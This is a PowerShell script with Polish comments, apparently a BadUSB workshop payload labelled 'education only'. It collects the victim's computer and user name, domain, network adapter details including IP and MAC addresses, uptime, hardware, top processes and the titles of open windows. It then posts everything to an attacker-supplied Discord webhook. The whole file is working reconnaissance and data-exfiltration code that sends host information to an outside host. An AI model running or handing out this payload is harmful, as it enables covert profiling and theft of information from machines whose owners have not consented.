# get_info.ps1 - Prosty zbieracz informacji dla Discord Webhook
param([string]$webhook)

# Zbieramy podstawowe info
$compName = $env:COMPUTERNAME
$userName = $env:USERNAME
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if (!$domain -or $domain -eq "") { $domain = "BRAK (grupa robocza)" }

# Sieciówki
$networks = @()
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}
foreach ($adapter in $adapters) {
    $name = (Get-WmiObject Win32_NetworkAdapter | Where-Object {$_.Index -eq $adapter.Index}).Name
    $ip = $adapter.IPAddress[0]
    $mask = $adapter.IPSubnet[0]
    $gw = $adapter.DefaultIPGateway -join ", "
    $dns = $adapter.DNSServerSearchOrder -join ", "
    $mac = $adapter.MACAddress
    
    $networks += "Karta: $name`r`nIP: $ip`r`nMaska: $mask`r`nBrama: $gw`r`nDNS: $dns`r`nMAC: $mac`r`n---"
}
if ($networks.Count -eq 0) { $networks = "Brak połączenia sieciowego" }
$networkText = ($networks -join "`r`n")
if ($networkText.Length -gt 1000) { $networkText = $networkText.Substring(0, 1000) + "..." }

# Uptime
$os = Get-WmiObject Win32_OperatingSystem
$uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"

# Procesor i RAM
$cpu = (Get-WmiObject Win32_Processor).Name
if ($cpu.Length -gt 100) { $cpu = $cpu.Substring(0, 100) + "..." }
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)

# Procesy (top 5 po CPU)
$procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | ForEach-Object {
    $cpuUsage = [math]::Round($_.CPU, 1)
    $ramUsage = [math]::Round($_.WorkingSet/1MB, 1)
    "$($_.ProcessName) (CPU: $cpuUsage% | RAM: $ramUsage MB)"
}
$procsText = ($procs -join "`r`n")
if ($procsText.Length -gt 1000) { $procsText = $procsText.Substring(0, 1000) + "..." }

# Aktywne okna
$windows = @(Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object -First 5 -ExpandProperty MainWindowTitle)
if ($windows.Count -eq 0) { $windows = @("Brak widocznych okien") }
$windowsText = ($windows -join "`r`n")
if ($windowsText.Length -gt 500) { $windowsText = $windowsText.Substring(0, 500) + "..." }

# Ręczne tworzenie JSON (bez ConvertTo-Json)
$json = @"
{
    "content": "NOWE URZADZENIE ZAINWENTARYZOWANE!",
    "embeds": [
        {
            "title": "Komputer: $compName",
            "color": 16711680,
            "fields": [
                { "name": "Uzytkownik", "value": "$($userName -replace '"', '\"')", "inline": true },
                { "name": "Domena", "value": "$($domain -replace '"', '\"')", "inline": true },
                { "name": "Uptime", "value": "$($uptimeStr -replace '"', '\"')", "inline": true },
                { "name": "CPU", "value": "$($cpu -replace '"', '\"')", "inline": false },
                { "name": "RAM", "value": "$ram GB", "inline": true },
                { "name": "Sieć", "value": "$($networkText -replace '"', '\"')", "inline": false },
                { "name": "Top 5 procesów", "value": "$($procsText -replace '"', '\"')", "inline": false },
                { "name": "Aktywne okna", "value": "$($windowsText -replace '"', '\"')", "inline": false }
            ],
            "footer": { "text": "BadUSB Warsztat - Tylko edukacja!" },
            "timestamp": "$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssK')"
        }
    ]
}
"@

# Wysyłamy na Discord
try {
    Write-Host "Wysyłanie..." -ForegroundColor Yellow
    $response = Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $json
    Write-Host "OK!" -ForegroundColor Green
} catch {
    Write-Host "Blad: $_" -ForegroundColor Red
    Write-Host "JSON który próbowano wysłać:" -ForegroundColor Red
    Write-Host $json -ForegroundColor Gray
}
